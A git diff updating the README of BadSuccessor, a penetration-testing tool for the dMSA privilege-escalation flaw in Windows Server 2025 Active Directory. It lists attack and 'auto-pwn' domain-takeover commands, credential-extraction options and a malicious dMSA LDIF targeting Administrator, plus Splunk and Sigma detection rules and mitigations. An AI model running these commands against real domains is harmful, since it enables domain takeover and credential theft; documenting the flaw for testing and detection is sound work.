@@ -1,5 +1,3 @@
-Note: users reporting mixed results. Use at your own risk.
-
 # BadSuccessor
 
 A penetration testing tool that exploits the dMSA (delegated Managed Service Account) privilege escalation vulnerability in Windows Server 2025 Active Directory environments.
@@ -7,6 +5,10 @@ A penetration testing tool that exploits the dMSA (delegated Managed Service Acc
 ## ⚠️ Legal Disclaimer
 
 **This tool is for authorized penetration testing and security research purposes only.** Use of this tool against systems without explicit written permission is illegal and unethical. The authors are not responsible for any misuse or damage caused by this tool.
+
+## 🚨 Important Notice
+
+**Users are reporting mixed results with this tool. Use at your own risk.** The tool's effectiveness depends on specific Windows Server 2025 schema implementations which may vary between environments.
 
 ## 📋 Overview
 
@@ -21,8 +23,8 @@ This tool is based on the excellent research by **Yuval Gordon** from **Akamai T
 
 The vulnerability exists in the dMSA migration process where:
 1. An attacker creates a malicious dMSA in any writable OU
-2. Sets `msDS-ManagedAccountPrecededByLink` to point to a target user
-3. Sets `msDS-DelegatedMSAState` to `2` (migration completed)
+2. Sets `msDS-ManagedAccountPrecededByLink` or `ms-DS-Managed-Account-Preceded-By-Link` to point to a target user
+3. Sets `msDS-DelegatedMSAState` or `ms-DS-Delegated-MSA-State` to `2` (migration completed)
 4. The KDC automatically grants the dMSA all privileges of the target user via PAC inheritance
 
 Additionally, the KERB-DMSA-KEY-PACKAGE structure contains the target user's password keys, enabling credential extraction.
@@ -37,11 +39,18 @@ Additionally, the KERB-DMSA-KEY-PACKAGE structure contains the target user's pas
 
 ### Python Dependencies
 ```bash
-pip3 install -r requirements.txt
+pip3 install ldap3 pyasn1 pycryptodome
+pip3 install impacket==0.12.0
 ```
 
-### Optional Dependencies (for enhanced Kerberos support)
+**Note**: The tool has been tested with impacket 0.12.0. Other versions may have compatibility issues.
+
+### Optional Dependencies
 ```bash
+# For DNS discovery
+pip3 install dnspython
+
+# For enhanced Kerberos support (system packages)
 # Ubuntu/Debian
 sudo apt-get install libkrb5-dev libgssapi-krb5-2
 
@@ -66,6 +75,15 @@ git clone https://github.com/cybrly/badsuccessor.git
 cd badsuccessor
 pip3 install -r requirements.txt
 chmod +x badsuccessor.py
+```
+
+### requirements.txt
+```
+ldap3>=2.9.1
+pyasn1>=0.4.8
+pycryptodome>=3.15.0
+impacket==0.12.0
+dnspython>=2.1.0
 ```
 
 ## 📖 Usage
@@ -94,6 +112,9 @@ python3 badsuccessor.py -d corp.local -u john -p Password123 --list-targets
 # Basic attack against Administrator
 python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator
 
+# Attack with specific DC IP
+python3 badsuccessor.py -d corp.local -u john -p Password123 --dc-ip 192.168.1.10 --attack --target Administrator
+
 # Attack with specific OU
 python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator --ou-dn "OU=ServiceAccounts,DC=corp,DC=local"
 
@@ -110,31 +131,8 @@ python3 badsuccessor.py -d corp.local -u john -p Password123 --extract-creds --t
 python3 badsuccessor.py -d corp.local -u john -p Password123 --auto-pwn
 ```
 
-### Advanced Connection Examples
-
-#### LDAPS (SSL/TLS) Connection
-```bash
-python3 badsuccessor.py -d corp.local -u john -p Password123 --dc-ip 192.168.1.10 --ldaps --attack --target Administrator
-```
-
-#### Kerberos Authentication
-```bash
-# With password
-python3 badsuccessor.py -d corp.local -u john -p Password123 --dc-ip 192.168.1.10 -k --attack --target Administrator
-
-# With ccache
-export KRB5CCNAME=/tmp/krb5cc_john
-python3 badsuccessor.py -d corp.local -u john --dc-ip 192.168.1.10 --ccache $KRB5CCNAME --no-pass --attack --target Administrator
-```
-
-#### NTLM Hash Authentication
-```bash
-python3 badsuccessor.py -d corp.local -u john --hash :aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 --dc-ip 192.168.1.10 --attack --target Administrator
-```
-
 ### Command Line Options
 
-#### Connection Parameters
 | Option | Description |
 |--------|-------------|
 | `-d, --domain` | Target domain (e.g., corp.local) **[REQUIRED]** |
@@ -142,40 +140,16 @@ python3 badsuccessor.py -d corp.local -u john --hash :aad3b435b51404eeaad3b435b5
 | `-p, --password` | Password for authentication |
 | `--dc-ip` | Domain Controller IP (auto-discover if omitted) |
 | `--ldaps` | Force LDAPS (SSL) connection on port 636 |
-| `--ldap` | Force LDAP (non-SSL) connection on port 389 |
-| `--port` | Custom LDAP port (overrides --ldaps/--ldap) |
-| `--no-ssl-fallback` | Disable automatic LDAPS→LDAP fallback |
-
-#### Authentication Options
-| Option | Description |
-|--------|-------------|
-| `--auth` | Authentication method: auto, kerberos, ntlm (default: auto) |
-| `--ccache` | Path to Kerberos ccache file |
-| `--no-pass` | Use Kerberos authentication without password |
-| `--hash` | NTLM hash for authentication (format: LM:NT or :NT) |
-| `-k, --kerberos` | Use Kerberos authentication (same as --auth kerberos) |
-
-#### Attack Options
-| Option | Description |
-|--------|-------------|
 | `--attack` | Perform the BadSuccessor attack |
 | `--target` | Target user to escalate privileges to |
-| `--dmsa-name` | Name for malicious dMSA (default: evil_dmsa) |
+| `--dmsa-name` | Name for malicious dMSA (auto-generated if not specified) |
 | `--ou-dn` | Specific OU DN to use (auto-detect if not specified) |
 | `--extract-creds` | Extract credentials using key package |
 | `--targets` | Comma-separated list of users for credential extraction |
 | `--auto-pwn` | Fully automated domain takeover |
-
-#### Enumeration Options
-| Option | Description |
-|--------|-------------|
 | `--enumerate` | Enumerate OUs with ANY write permissions |
 | `--list-targets` | List high-value targets |
 | `--check-schema` | Verify Windows Server 2025 schema |
-
-#### Maintenance Options
-| Option | Description |
-|--------|-------------|
 | `--cleanup` | Remove created dMSA |
 | `--dmsa-dn` | dMSA DN for cleanup operations |
 | `--no-banner` | Suppress banner output |
@@ -205,11 +179,23 @@ The tool provides ready-to-use commands for:
 - Lateral movement
 - Persistence establishment
 
-## 🔐 Enhanced Features (v2.1.0)
+## 🔐 Enhanced Features (v2.2.0)
+
+### Schema Attribute Flexibility
+- **NEW**: Supports both attribute naming conventions:
+  - Classic: `msDS-ManagedAccountPrecededByLink`
+  - Hyphenated: `ms-DS-Managed-Account-Preceded-By-Link`
+- Automatically detects which format your environment uses
+- Compatible with various Windows Server 2025 implementations
+
+### Import Compatibility
+- **FIXED**: Resolved impacket import issues
+- **FIXED**: Removed dependency on `seq_decode` and other problematic imports
+- **IMPROVED**: Better compatibility with impacket 0.12.0
 
 ### Comprehensive Permission Checking
-- **NEW**: Checks for ALL write permissions, not just CreateChild
-- **NEW**: Detects permissions from default groups (Authenticated Users, Everyone, etc.)
+- Checks for ALL write permissions, not just CreateChild
+- Detects permissions from default groups (Authenticated Users, Everyone, etc.)
 - Evaluates actual permissions on OUs including:
   - CreateChild
   - Write
@@ -219,7 +205,7 @@ The tool provides ready-to-use commands for:
 - Shows exact permissions for each discovered OU
 
 ### Default Group Support
-- **NEW**: Automatically includes default group memberships in permission checks
+- Automatically includes default group memberships in permission checks
 - Handles permissions granted to:
   - Authenticated Users (S-1-5-11)
   - Everyone (S-1-1-0)
@@ -229,29 +215,9 @@ The tool provides ready-to-use commands for:
   - This Organization
 
 ### Complete Implementation
-- **FIXED**: All features fully implemented (no placeholder code)
-- **FIXED**: Proper error handling throughout
-- **IMPROVED**: More informative output and logging
-
-### Windows Server 2025 Schema Verification
-- Validates all required dMSA schema elements
-- Checks for critical attributes before attempting exploitation
-- Provides clear warnings if environment doesn't support dMSAs
-
-### Full Kerberos Authentication
-- Native Kerberos AS-REQ/AS-REP implementation
-- Proper dMSA authentication with PAC manipulation
-- Ticket saving to ccache format
-
-### KERB-DMSA-KEY-PACKAGE Extraction
-- ASN.1 parsing of key package structure
-- Extraction of current and previous keys
-- Automatic identification of NTLM hashes and Kerberos keys
-
-### Mass Credential Extraction
-- Automated creation of temporary dMSAs
-- Parallel extraction of multiple user credentials
-- Clean removal of artifacts after extraction
+- All features fully implemented (no placeholder code)
+- Proper error handling throughout
+- More informative output and logging
 
 ## 🛡️ Detection
 
@@ -268,14 +234,16 @@ The tool provides ready-to-use commands for:
 ```
 # Splunk Query Example
 index=windows EventCode=5137
-| where ObjectClass="msDS-DelegatedManagedServiceAccount"
+| where ObjectClass="msDS-DelegatedManagedServiceAccount" OR ObjectClass="ms-DS-Delegated-Managed-Service-Account"
 | where NOT user IN ("approved_admins")
 
 # Sigma Rule Example
 detection:
   selection:
     EventID: 5136
-    AttributeLDAPDisplayName: 'msDS-ManagedAccountPrecededByLink'
+    AttributeLDAPDisplayName:
+      - 'msDS-ManagedAccountPrecededByLink'
+      - 'ms-DS-Managed-Account-Preceded-By-Link'
   condition: selection
 ```
 
@@ -299,9 +267,9 @@ detection:
 
 2. **Monitor dMSA Operations**
    ```powershell
-   # Enable auditing on dMSA attributes
+   # Enable auditing on dMSA attributes (both naming conventions)
    Set-ADObject -Identity "CN=Schema,CN=Configuration,DC=corp,DC=local" -Add @{
-     'msDS-ReplAttributeMetaData' = 'msDS-ManagedAccountPrecededByLink'
+     'msDS-ReplAttributeMetaData' = @('msDS-ManagedAccountPrecededByLink', 'ms-DS-Managed-Account-Preceded-By-Link')
    }
    ```
 
@@ -334,31 +302,12 @@ objectClass: msDS-GroupManagedServiceAccount
 objectClass: msDS-DelegatedManagedServiceAccount
 sAMAccountName: evil_dmsa$
 userAccountControl: 4096
+# Note: Your environment may use either format below
 msDS-ManagedAccountPrecededByLink: CN=Administrator,CN=Users,DC=corp,DC=local
+# OR
+ms-DS-Managed-Account-Preceded-By-Link: CN=Administrator,CN=Users,DC=corp,DC=local
 msDS-DelegatedMSAState: 2
 msDS-SupportedEncryptionTypes: 28
-```
-
-### PAC Inheritance Flow
-```
-1. Client → KDC: AS-REQ for evil_dmsa$
-2. KDC: Read msDS-ManagedAccountPrecededByLink
-3. KDC: Build PAC with Administrator's SIDs
-4. KDC → Client: AS-REP with privileged PAC
-5. Client: Now has Administrator privileges
-```
-
-### Key Package Structure
-```
-KERB-DMSA-KEY-PACKAGE ::= SEQUENCE {
-    current-keys [0] SEQUENCE OF EncryptionKey,
-    previous-keys [1] SEQUENCE OF EncryptionKey OPTIONAL
-}
-
-EncryptionKey ::= SEQUENCE {
-    keytype [0] Int32,
-    keyvalue [1] OCTET STRING
-}
 ```
 
 ## 🤝 Contributing
@@ -375,13 +324,21 @@ Contributions are welcome! Please:
 - Add unit tests for new features
 - Update documentation
 - Test against multiple AD environments
+- Test with different schema attribute naming conventions
 
 ## 📝 Changelog
+
+### v2.2.0 (2025-05-27) - Compatibility Update
+- **FIXED**: Resolved impacket import issues (removed seq_decode dependency)
+- **FIXED**: Compatible with impacket 0.12.0
+- **FEATURE**: Added support for both dMSA attribute naming conventions
+- **IMPROVED**: Better error handling for import failures
+- **IMPROVED**: More robust schema detection
 
 ### v2.1.0 (2025-05-25) - Complete Implementation
 - **MAJOR**: Enhanced ACL permission checking - now detects ALL write permissions
 - **MAJOR**: Added support for default groups (Authenticated Users, Everyone, etc.)
-- **FIXED**: Removed all placeholder code and AI comments
+- **FIXED**: Removed all placeholder code
 - **FIXED**: Complete implementation of all features
 - **IMPROVED**: Better error handling and informative output
 - **IMPROVED**: More comprehensive OU enumeration (includes containers)
@@ -400,32 +357,43 @@ Contributions are welcome! Please:
 - **Improvement**: Better error handling and logging
 - **Improvement**: Production-ready code structure
 
-### v1.2.0 (2025-05-23)
-- Added comprehensive Kerberos authentication support
-- Implemented LDAPS with automatic fallback
-- Enhanced schema detection and object creation fallbacks
-- Improved error handling and compatibility
-
-### v1.1.0 (2025-05-23)
-- Added LDAPS (SSL/TLS) support
-- Enhanced object creation with multiple class fallbacks
-- Improved schema detection for various AD versions
-
-### v1.0.0 (2025-05-23)
-- Initial release
-- Linux-compatible implementation
-- LDAP-based exploitation
-
 ## 📚 References
 
 - [Original Akamai Research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
 - [GitHub Issue #1 - Enhanced Permission Checking](https://github.com/cybrly/badsuccessor/issues/1)
+- [GitHub Issue #2 - Schema Attribute Naming](https://github.com/cybrly/badsuccessor/issues/2)
 
 ## 🐛 Known Issues
 
+- Mixed results reported by users - effectiveness depends on specific Windows Server 2025 implementation
+- Some environments may use different attribute naming conventions
 - Hash authentication requires password for initial implementation
 - Some environments may require manual Kerberos configuration
 - Detection rules need customization per environment
+
+## 🔍 Troubleshooting
+
+### Import Errors
+If you encounter import errors with impacket:
+```bash
+# Ensure you have the correct version
+pip3 uninstall impacket
+pip3 install impacket==0.12.0
+```
+
+### Schema Detection Failures
+If schema detection fails, manually verify attribute names:
+```powershell
+# On Domain Controller
+Get-ADObject -Filter {name -like "*delegated*"} -SearchBase "CN=Schema,CN=Configuration,DC=corp,DC=local" | Select Name
+```
+
+### Permission Denied Errors
+Ensure your user has at least one of the required permissions:
+```bash
+# Use --enumerate to check your permissions
+python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate
+```
 
 ## 📧 Contact
 
